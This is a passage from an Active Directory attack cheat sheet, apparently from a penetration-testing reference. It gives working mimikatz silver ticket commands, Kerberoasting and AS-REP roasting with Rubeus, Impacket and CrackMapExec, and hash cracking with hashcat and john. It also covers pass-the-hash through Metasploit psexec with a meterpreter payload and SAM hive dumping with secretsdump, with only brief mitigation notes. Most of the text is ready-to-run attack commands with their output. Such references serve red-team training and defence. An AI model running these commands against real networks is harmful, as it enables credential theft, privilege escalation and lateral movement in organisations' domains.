</span><span class="n">mimikatz</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">/kerberos::golden</span><span class="w"> </span><span class="nx">/domain:adsec.local</span><span class="w"> </span><span class="nx">/user:ANY</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-1423455951-1752654185-1824483205</span><span class="w"> </span><span class="nx">/rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><span class="w"> </span><span class="nx">/target:DESKTOP-01.adsec.local</span><span class="w"> </span><span class="nx">/service:cifs</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">mimikatz</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:jurassic.park</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-1339291983-1349129144-367733775</span><span class="w"> </span><span class="nx">/rc4:b18b4b218eccad1c223306ea1916885f</span><span class="w"> </span><span class="nx">/user:stegosaurus</span><span class="w"> </span><span class="nx">/service:cifs</span><span class="w"> </span><span class="nx">/target:labwws02.jurassic.park</span><span class="w">

</span><span class="c"># Then use the same steps as a Golden ticket</span><span class="w">
</span><span class="n">mimikatz</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">misc::convert</span><span class="w"> </span><span class="nx">ccache</span><span class="w"> </span><span class="nx">ticket.kirbi</span><span class="w">

</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:/tmp</span><span class="err">$</span><span class="w"> </span><span class="nx">export</span><span class="w"> </span><span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="n">/home/user/ticket.ccache</span><span class="w">
</span><span class="nx">root</span><span class="err">@</span><span class="nx">kali:/tmp</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/psexec.py</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="nt">-dc-ip</span><span class="w"> </span><span class="nx">192.168.1.1</span><span class="w"> </span><span class="nx">AD/administrator</span><span class="err">@</span><span class="nx">192.168.1.100</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<p>Interesting services to target with a silver ticket :</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Service Type</th>
      <th>Service Silver Tickets</th>
      <th>Attack</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>WMI</td>
      <td>HOST + RPCSS</td>
      <td><code class="language-plaintext highlighter-rouge">wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"</code></td>
    </tr>
    <tr>
      <td>PowerShell Remoting</td>
      <td>HTTP + wsman</td>
      <td><code class="language-plaintext highlighter-rouge">New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
    </tr>
    <tr>
      <td>WinRM</td>
      <td>HTTP + wsman</td>
      <td><code class="language-plaintext highlighter-rouge">New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
    </tr>
    <tr>
      <td>Scheduled Tasks</td>
      <td>HOST</td>
      <td><code class="language-plaintext highlighter-rouge">schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"</code></td>
    </tr>
    <tr>
      <td>Windows File Share (CIFS)</td>
      <td>CIFS</td>
      <td><code class="language-plaintext highlighter-rouge">dir \\dc01\c$</code></td>
    </tr>
    <tr>
      <td>LDAP operations including Mimikatz DCSync</td>
      <td>LDAP</td>
      <td><code class="language-plaintext highlighter-rouge">lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code></td>
    </tr>
    <tr>
      <td>Windows Remote Server Administration Tools</td>
      <td>RPCSS   + LDAP  + CIFS</td>
      <td>/</td>
    </tr>
  </tbody>
</table></div>

<p>Mitigations:</p>
<ul>
  <li>Set the attribute “Account is Sensitive and Cannot be Delegated” to prevent lateral movement with the generated ticket.</li>
</ul>

<h3 id="kerberoasting">Kerberoasting</h3>

<blockquote>
  <p>“A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. “ - <a href="https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names">MSDN</a></p>
</blockquote>

<p>Any valid domain user can request a kerberos ticket (TGS) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">GetUserSPNs</code> from Impacket Suite
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">GetUserSPNs.py</span><span class="w"> </span><span class="nx">active.htb/SVC_TGS:GPPstillStandingStrong2k18</span><span class="w"> </span><span class="nt">-dc-ip</span><span class="w"> </span><span class="nx">10.10.10.100</span><span class="w"> </span><span class="nt">-request</span><span class="w">

</span><span class="n">Impacket</span><span class="w"> </span><span class="nx">v0.9.17</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Copyright</span><span class="w"> </span><span class="nx">2002-2018</span><span class="w"> </span><span class="nx">Core</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">Technologies</span><span class="w">

</span><span class="n">ServicePrincipalName</span><span class="w">  </span><span class="nx">Name</span><span class="w">           </span><span class="nx">MemberOf</span><span class="w">                                                  </span><span class="nx">PasswordLastSet</span><span class="w">      </span><span class="nx">LastLogon</span><span class="w">           
</span><span class="o">--------------------</span><span class="w">  </span><span class="o">-------------</span><span class="w">  </span><span class="o">--------------------------------------------------------</span><span class="w">  </span><span class="o">-------------------</span><span class="w">  </span><span class="o">-------------------</span><span class="w">
</span><span class="n">active/CIFS:445</span><span class="w">       </span><span class="nx">Administrator</span><span class="w">  </span><span class="nx">CN</span><span class="o">=</span><span class="n">Group</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">Creator</span><span class="w"> </span><span class="nx">Owners</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">active</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="w">  </span><span class="nx">2018-07-18</span><span class="w"> </span><span class="nx">21:06:40</span><span class="w">  </span><span class="nx">2018-12-03</span><span class="w"> </span><span class="nx">17:11:11</span><span class="w"> 

</span><span class="nv">$krb5tgs$23</span><span class="err">$</span><span class="o">*</span><span class="n">Administrator</span><span class="nv">$ACTIVE</span><span class="o">.</span><span class="nf">HTB</span><span class="nv">$active</span><span class="nx">/CIFS~445</span><span class="o">*</span><span class="nv">$424338c0a3c3af43</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="nx">84fd2</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>CrackMapExec Module
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">ldap</span><span class="w"> </span><span class="nx">10.10.10.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'username'</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="nt">--kerberoasting</span><span class="w"> </span><span class="nx">output.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># Kerberoast (RC4 ticket)</span><span class="w">
</span><span class="o">.</span><span class="n">\rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/creduser:DOMAIN\JOHN</span><span class="w"> </span><span class="nx">/credpassword:MyP</span><span class="err">@</span><span class="nx">ssW0RD</span><span class="w"> </span><span class="nx">/outfile:hash.txt</span><span class="w">

</span><span class="c"># Kerberoast (AES ticket)</span><span class="w">
</span><span class="c"># Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/tgtdeleg</span><span class="w">

</span><span class="c"># Kerberoast (RC4 ticket)</span><span class="w">
</span><span class="c"># The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</span><span class="w">
</span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/rc4opsec</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Request-SPNTicket</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="s2">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/its-a-feature/bifrost">bifrost</a> on <strong>macOS</strong> machine
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">/bifrost</span><span class="w"> </span><span class="nt">-action</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nt">-ticket</span><span class="w"> </span><span class="nx">doIF</span><span class="err">&lt;</span><span class="o">...</span><span class="nf">snip</span><span class="o">...</span><span class="err">&gt;</span><span class="nx">QUw</span><span class="o">=</span><span class="w"> </span><span class="nt">-service</span><span class="w"> </span><span class="n">host/dc1-lab.lab.local</span><span class="w"> </span><span class="nt">-kerberoast</span><span class="w"> </span><span class="nx">true</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<p>Then crack the ticket using the correct hashcat mode (<code class="language-plaintext highlighter-rouge">$krb5tgs$23</code>= <code class="language-plaintext highlighter-rouge">etype 23</code>)</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Mode</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>13100</td>
      <td>Kerberos 5 TGS-REP etype 23 (RC4)</td>
    </tr>
    <tr>
      <td>19600</td>
      <td>Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)</td>
    </tr>
    <tr>
      <td>19700</td>
      <td>Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)</td>
    </tr>
  </tbody>
</table></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">.</span><span class="n">/hashcat</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">13100</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">kerberos_hashes.txt</span><span class="w"> </span><span class="nx">crackstation.txt</span><span class="w">
</span><span class="o">.</span><span class="n">/john</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">/opt/wordlists/rockyou.txt</span><span class="w"> </span><span class="nt">--fork</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="nt">--format</span><span class="o">=</span><span class="n">krb5tgs</span><span class="w"> </span><span class="nx">~/kerberos_hashes.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Mitigations:</p>
<ul>
  <li>Have a very long password for your accounts with SPNs (&gt; 32 characters)</li>
  <li>Make sure no users have SPNs</li>
</ul>

<h3 id="krb_as_rep-roasting">KRB_AS_REP Roasting</h3>

<blockquote>
  <p>If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p>
</blockquote>

<p><strong>Requirements</strong>:</p>
<ul>
  <li>
    <p>Accounts with the attribute <strong>DONT_REQ_PREAUTH</strong> (<code class="language-plaintext highlighter-rouge">PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>)</p>
  </li>
  <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="n">C:\Rubeus</span><span class="err">&gt;</span><span class="nx">Rubeus.exe</span><span class="w"> </span><span class="nx">asreproast</span><span class="w"> </span><span class="nx">/user:TestOU3user</span><span class="w"> </span><span class="nx">/format:hashcat</span><span class="w"> </span><span class="nx">/outfile:hashes.asreproast</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Action:</span><span class="w"> </span><span class="nx">AS-REP</span><span class="w"> </span><span class="nx">roasting</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="nx">User</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">TestOU3user</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="nx">Domain</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">testlab.local</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">SamAccountName</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">TestOU3user</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">DistinguishedName</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">TestOU3user</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">TestOU3</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">TestOU2</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">TestOU1</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">testlab</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">controller:</span><span class="w"> </span><span class="nx">testlab.local</span><span class="w"> </span><span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">52</span><span class="o">.</span><span class="nf">100</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">AS-REQ</span><span class="w"> </span><span class="p">(</span><span class="n">w/o</span><span class="w"> </span><span class="nx">preauth</span><span class="p">)</span><span class="w"> </span><span class="kr">for</span><span class="p">:</span><span class="w"> </span><span class="s1">'testlab.local\TestOU3user'</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Connecting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">192.168.52.100:88</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Sent</span><span class="w"> </span><span class="nx">169</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Received</span><span class="w"> </span><span class="nx">1437</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">AS-REQ</span><span class="w"> </span><span class="nx">w/o</span><span class="w"> </span><span class="nx">preauth</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">AS-REP</span><span class="w"> </span><span class="nx">hash:</span><span class="w">

</span><span class="nv">$krb5asrep$TestOU3user</span><span class="err">@</span><span class="n">testlab.local:858B6F645D9F9B57210292E5711E0...</span><span class="p">(</span><span class="n">snip</span><span class="p">)</span><span class="o">...</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><code class="language-plaintext highlighter-rouge">GetNPUsers</code> from Impacket Suite
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">GetNPUsers.py</span><span class="w"> </span><span class="nx">htb.local/svc-alfresco</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="nx">TGT</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">svc-alfresco</span><span class="w">
</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span><span class="err">@</span><span class="n">HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee</span><span class="nv">$cb8e87d02bd0ac7a</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="nx">e776b4</span><span class="w">

</span><span class="c"># extract hashes</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">GetNPUsers.py</span><span class="w"> </span><span class="nx">jurassic.park/</span><span class="w"> </span><span class="nt">-usersfile</span><span class="w"> </span><span class="nx">usernames.txt</span><span class="w"> </span><span class="nt">-format</span><span class="w"> </span><span class="nx">hashcat</span><span class="w"> </span><span class="nt">-outputfile</span><span class="w"> </span><span class="nx">hashes.asreproast</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">GetNPUsers.py</span><span class="w"> </span><span class="nx">jurassic.park/triceratops:Sh4rpH0rns</span><span class="w"> </span><span class="nt">-request</span><span class="w"> </span><span class="nt">-format</span><span class="w"> </span><span class="nx">hashcat</span><span class="w"> </span><span class="nt">-outputfile</span><span class="w"> </span><span class="nx">hashes.asreproast</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>CrackMapExec Module
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">ldap</span><span class="w"> </span><span class="nx">10.10.10.100</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'username'</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="nt">--asreproast</span><span class="w"> </span><span class="nx">output.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> or <code class="language-plaintext highlighter-rouge">john</code> to crack the ticket.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c"># crack AS_REP messages with hashcat</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">hashcat</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">18200</span><span class="w"> </span><span class="nt">--force</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">hashes.asreproast</span><span class="w"> </span><span class="nx">passwords_kerb.txt</span><span class="w"> 
</span><span class="n">root</span><span class="err">@</span><span class="nx">windows:hashcat</span><span class="err">$</span><span class="w"> </span><span class="nx">hashcat64.exe</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">18200</span><span class="w"> </span><span class="s1">'&lt;AS_REP-hash&gt;'</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">c:\wordlists\rockyou.txt</span><span class="w">

</span><span class="c"># crack AS_REP messages with john</span><span class="w">
</span><span class="n">C:\Rubeus</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">john</span><span class="w"> </span><span class="nt">--format</span><span class="o">=</span><span class="n">krb5asrep</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">passwords_kerb.txt</span><span class="w"> </span><span class="nx">hashes.asreproast</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><strong>Mitigations</strong>:</p>
<ul>
  <li>All accounts must have “Kerberos Pre-Authentication” enabled (Enabled by Default).</li>
</ul>

<h3 id="pass-the-hash">Pass-the-Hash</h3>

<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">use</span><span class="w"> </span><span class="nx">exploit/windows/smb/psexec</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">RHOST</span><span class="w"> </span><span class="nx">10.2.0.3</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">SMBUser</span><span class="w"> </span><span class="nx">jarrieta</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">SMBPass</span><span class="w"> </span><span class="nx">nastyCutt3r</span><span class="w">  
</span><span class="c"># NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.</span><span class="w">
</span><span class="c"># NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">PAYLOAD</span><span class="w"> </span><span class="nx">windows/meterpreter/bind_tcp</span><span class="w">
</span><span class="n">run</span><span class="w">
</span><span class="nx">shell</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>or with crackmapexec</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.2.0.2</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">jarrieta</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s1">'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d'</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w">
</span><span class="n">also</span><span class="w"> </span><span class="nx">works</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">range</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.2.0.2/24</span><span class="w"> </span><span class="o">...</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<p>or with psexec</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">proxychains</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="o">.</span><span class="nx">/psexec.py</span><span class="w"> </span><span class="nx">jarrieta</span><span class="err">@</span><span class="nx">10.2.0.2</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="p">:</span><span class="nx">489a04c09a5debbc9b975356693e179d</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>or with the builtin Windows RDP and mimikatz</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">sekurlsa::pth</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ntlm:</span><span class="err">&lt;</span><span class="nx">the</span><span class="w"> </span><span class="nx">user</span><span class="s1">'s ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"
</span></pre></td></tr></tbody></table></code></div></div>

<p>You can extract the local <strong>SAM database</strong> to find the local administrator hash :</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\sam</span><span class="w"> </span><span class="nx">c:\temp\sam.save</span><span class="w">
</span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\security</span><span class="w"> </span><span class="nx">c:\temp\security.save</span><span class="w">
</span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">c:\temp\system.save</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">secretsdump.py</span><span class="w"> </span><span class="nt">-sam</span><span class="w"> </span><span class="nx">sam.save</span><span class="w"> </span><span class="nt">-security</span><span class="w"> </span><span class="nx">security.save</span><span class="w"> </span><span class="nt">-system</span><span class="w"> </span><span class="nx">system.save</span><span class="w"> </span><span class="nx">LOCAL</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</h3>

<p>Request a TGT with only the NT hash then you can connect to the machine using the TGT.</p>

<h4 id="using-impacket">Using impacket</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="o">.</span><span class="nx">/getTGT.py</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="p">:</span><span class="nx">1a59bd44fe5bec39c44c8cd3524dee</span><span class="w"> </span><span class="nx">lab.ropnop.com</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">export</span><span class="w"> </span><span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="n">/root/impacket-examples/velociraptor.ccache</span><span class="w">
</span><span class="nx">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">psexec.py</span><span class="w"> </span><span class="nx">jurassic.park/velociraptor</span><span class="err">@</span><span class="nx">labwws02.jurassic.park</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w">

</span><span class="n">also</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">AES</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">if</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">it</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:impacket-examples</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/getTGT.py</span><span class="w"> </span><span class="nt">-aesKey</span><span class="w"> </span><span class="nx">xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx</span><span class="w"> </span><span class="nx">lab.ropnop.com</span><span class="w">

